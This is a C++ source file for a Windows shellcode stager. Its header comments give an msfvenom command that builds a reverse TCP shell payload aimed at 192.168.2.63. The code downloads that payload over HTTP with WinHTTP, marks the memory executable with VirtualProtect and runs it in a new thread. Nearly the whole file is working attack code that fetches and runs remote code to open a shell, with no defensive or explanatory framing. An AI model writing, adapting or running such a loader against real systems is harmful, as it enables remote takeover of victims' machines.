// For msfvenom the following shellcode is needed
// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.63 LPORT=8080 EXITFUNC=thread -f raw -o shellcode.bin
// Then serve that payload on port 80

#include <Windows.h>
#include <winhttp.h>
#include <vector>
#include <iostream>
#include <conio.h>

// Look for this on lib
#pragma comment(lib, "winhttp.lib")

// Download function declaration
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

// Function to download shellcode served
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
    // initialize http session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    // open session connection
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTP_PORT, //port 80
        0
    );

    // use connection to make request
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    // send HTTP request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    // receive response from request
    WinHttpReceiveResponse(
        hRequest,
        NULL
    );

    // read data from response
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }
    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

int main()
{
    std::vector<BYTE> shellcode = Download(L"192.168.2.63\0", L"/shellcode.bin\0");

    // get pointer to buffer
    LPVOID ptr = &shellcode[0];

    // set current memory to RWX to execute on current HEAP
    DWORD oldProtect;
    VirtualProtect(
        ptr,
        shellcode.size(),
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );

    // Run shellcode in the background of current process
    DWORD threadId = 0;
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)ptr,
        NULL,
        0,
        &threadId
    );

    // close handle
    CloseHandle(hThread);

    //temp stopper
    std::cout << "Shellcode is running, pres key to exit " << std::endl;
    _getch();
}

